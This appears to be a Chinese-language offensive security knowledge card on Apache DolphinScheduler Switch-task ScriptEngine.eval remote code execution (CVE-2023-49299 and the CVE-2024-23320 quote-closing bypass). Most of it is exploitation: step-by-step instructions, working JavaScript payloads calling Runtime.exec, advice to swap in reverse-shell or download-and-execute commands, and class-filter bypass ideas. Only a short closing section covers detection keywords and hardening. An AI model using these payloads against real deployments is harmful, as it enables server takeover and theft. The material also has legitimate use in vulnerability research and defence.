---
id: web-java-component-dolphinscheduler-switch-scriptengine-eval-rce
title: Apache DolphinScheduler Switch 任务条件 ScriptEngine.eval RCE：CVE-2023-49299 与 CVE-2024-23320 变量替换引号闭合绕过
type: scenario
domain: web
path: web/java/component
technique: dolphinscheduler-switch-scriptengine-eval-rce
aliases:
- DolphinScheduler RCE
- CVE-2023-49299
- CVE-2024-23320
- SwitchTaskUtils evaluate
- SwitchTaskProcessor
- 工作流 Switch 条件注入
- ScriptEngineManager eval
- generateContentWithTaskParams 绕过
tags:
- java
- dolphinscheduler
- scriptengine
- eval
- nashorn
- rce
- workflow
- cve-2023-49299
- cve-2024-23320
cve:
- CVE-2023-49299
- CVE-2024-23320
severity: critical
confidence: high
affected_versions: 原文标注：3.1.8 存在 CVE-2023-49299（3.1.9 新增 generateContentWithTaskParams 校验修复）；3.1.9 可被 CVE-2024-23320 的变量值引号闭合绕过（原文未给完整受影响区间）
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V507
  verified_at: '2026-11-11T04:44:48+08:00'
  notes: 已对照13419原文与全部10图核对：图01 diff 3.1.9 vs 3.1.8 显示 SwitchTaskUtils.evaluate 用 ScriptEngineManager 且 3.1.9 新增 generateContentWithTaskParams；图02 SwitchTaskProcessor 3.1.9 改用 generateContentWithTaskParams、旧版 setTaskParams；图03-05 新建 SWITCH 节点条件填 JS、工作流、3.1.9 条件填 ${a} 与启动参数 payload 闭合引号；与卡中 CVE-2023-49299（3.1.8 直接 eval）与 CVE-2024-23320（3.1.9 变量值引号闭合绕过）叙述一致。CVE 映射与原文标题/小节一致；affected_versions 按原文标注 3.1.8/3.1.9 边界，未臆测完整区间。dedup：与 AJ-Report ScriptEngine eval（不同产品/接口）、通用 Nashorn/类过滤器卡为不同场景，非同链；库内无其他 DolphinScheduler 卡。保留说明：'JDK 8/11 为 Nashorn' 为合理推断（原文未写 JDK 版本），已限定为引擎边界说明；卡内明确指出为登录后/需工作流权限，未夸大为未授权。无 sources/source_url；未复跑 PoC。
---

## 一句话结论

Apache DolphinScheduler 的 Switch 任务把用户在“条件”里填写的字符串交给 `SwitchTaskUtils.evaluate()`，内部用 `ScriptEngineManager.getEngineByName("js").eval(expression)` 直接执行；3.1.8 可直接写 Nashorn JS 调 `java.lang.Runtime.getRuntime().exec()` 命令执行；3.1.9 新增 `generateContentWithTaskParams()` 要求条件匹配 `${...}` 并把变量值加引号替换，但未转义变量值中的双引号与分号，攻击者用启动参数 `a = \";var a = mainOutput(); ...;//` 闭合字符串后仍可注入 JS，形成登录后 RCE（CVE-2023-49299 / CVE-2024-23320）。

## 原理

- **入口与 sink**：工作流中的 Switch 任务对应 `SwitchTaskProcessor`，它读取节点配置的 `condition`（“条件”），在旧版本中经 `setTaskParams()` 处理（把 `${变量}` 替换为全局/启动参数值）后调用 `SwitchTaskUtils.evaluate(content)`；`evaluate()` 用 `ScriptEngineManager` 取名为 `js` 的引擎（JDK 8/11 为 Nashorn）并 `engine.eval(expression)`，返回值转 Boolean 作为分支判断。
- **为什么能执行命令**：Nashorn 默认允许 JS 通过 `java.*`/`Packages.*` 访问 Java 类，`java.lang.Runtime.getRuntime().exec("...")` 即可起进程；脚本引擎没有沙箱或类过滤器时，条件字段等价于一个任意 JS 执行入口。
- **3.1.9 的修复逻辑**：新增 `generateContentWithTaskParams(condition, globalParams, varParams)`：先用正则 `['\"]*\\$\{(.*?)\}['\"]*` 要求条件里必须出现 `${...}`，否则抛异常；命中后用 `"值"` 形式把变量值拼进条件（数字/布尔不加引号）。目的是让用户无法直接提交纯 JS，只能提交带占位符的表达式。
- **绕过（CVE-2024-23320）**：变量值在拼接时只加了外层双引号，没有对值内部的 `"`/`;`/`//` 做转义或转义后校验。把启动参数 `a` 的值设为 `\";var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec(\"touch /tmp/rce\")};//`，条件写 `${a}`，替换后得到类似 `\"\";var a=...;//\"` 的 JS：开头的 `\"` 闭合字符串，随后注入语句，`//` 注释掉尾部引号，脚本引擎照常执行。
- **权限边界**：这是“登录后/授权用户”RCE——需要账号拥有项目与工作流定义/执行权限（能创建 Switch 任务并运行）。不是未授权漏洞，但在多租户调度平台中普通开发者账号通常具备该权限。
- **版本与引擎边界**：JDK 15+ 移除了 Nashorn（需额外 Nashorn-core 依赖）；若启用了 JEP 202 类过滤器或自定义 `ClassFilter` 限制 `java.lang.Runtime`，直接 exec 可能被拦，但仍可能存在其他绕过类（如 `java.lang.ProcessBuilder`、反射/脚本引擎嵌套）。

## 触发条件

- 目标 DolphinScheduler 版本存在该逻辑（原文对比 3.1.8 与 3.1.9；3.1.9 可被绕过）。
- 攻击者拥有可登录账号，且具备创建/编辑工作流定义与执行工作流的权限。
- 服务端脚本引擎可用（Nashorn/GraalJS 等 `js` 引擎），且未限制 Java 类访问。
- 3.1.9 绕过要求能设置工作流启动参数（Start Parameters）并在条件中引用该变量。

## 利用步骤

1. 登录 DolphinScheduler，进入“项目管理 → 工作流定义”，新建工作流并拖入一个 SWITCH 任务节点。
2. 3.1.8 直接注入：在 Switch 节点“条件”中填入
   `var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("touch /tmp/rce")};`
   保存并上线/运行工作流，命令在服务端执行。
3. 3.1.9 绕过：条件填 `${a}`；在运行工作流的“启动参数”中新增参数 `a`，值为
   `";var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("touch /tmp/rce")};//`
   保存并运行，替换后的 JS 闭合字符串并执行注入语句。
4. 将 `touch /tmp/rce` 换成反弹 shell/下载执行等命令；验证时用无害命令（如 `id > /tmp/x`）并检查回显/文件。
5. 若被类过滤器拦截，尝试 `java.lang.ProcessBuilder`、反射调用或脚本引擎嵌套等替代；JDK 版本决定可用引擎。

## PoC

```text
# 3.1.8：Switch 节点“条件”直接填 JS
var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("touch /tmp/rce")};

# 3.1.9：条件填 ${a}，启动参数 a 的值填（注意开头的 " 与结尾的 //）
";var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("touch /tmp/rce")};//
```

```text
# 原始代码路径（原文 diff）：
# SwitchTaskProcessor -> SwitchTaskUtils.generateContentWithTaskParams(condition, globalParams, varParams)
#                     -> SwitchTaskUtils.evaluate(content)
#                     -> ScriptEngineManager.getEngineByName("js").eval(expression)
```

## 变体与关联

- 变体：其他工作流节点/参数（如 Shell、SQL、条件分支）若把用户输入传给脚本引擎，同样可复用该思路；以具体处理器代码为准。
- 变体：JDK 高版本无 Nashorn 时，可尝试脚本引擎注入到 GraalJS、Groovy、BeanShell 等其他引擎；类过滤器存在时尝试 ProcessBuilder/反射绕过。
- 关联：[[web-java-component-aj-report-scriptengine-eval-rce]]（另一个产品的 ScriptEngine.eval RCE）、[[web-java-expression-scriptengine-isjson-eval]]（通用 ScriptEngine eval 注入）、[[web-java-rce-flowable-script-execution-listener]]（工作流脚本执行监听器 RCE）、[[web-java-rce-ruoyi-job-invoke-target-reflection-snakeyaml]]（调度任务调用目标注入）。
- 边界：无工作流权限、脚本引擎被禁用、类过滤器严格限制 Java 类访问、JDK 无 `js` 引擎且未加依赖时，利用失败。

## 检测与防御

- 检测：审计工作流定义中 Switch/条件节点的 `condition` 与启动参数，出现 `java.lang.Runtime`、`ProcessBuilder`、`mainOutput`、`eval` 等关键字即高度可疑；监控 DolphinScheduler API/Worker 进程派生的 `sh`/`cmd`/`touch` 等子进程。
- 防御：升级到修复版本；对工作流脚本/条件使用白名单表达式或沙箱引擎（禁用 Java 类访问、启用 ClassFilter）；限制普通用户创建工作流的权限并做审批。
- 加固：把调度平台放在内网并最小权限运行；对启动参数与条件字段做输入校验（拒绝引号、分号、`java.`、`Runtime` 等）；记录工作流变更审计日志。
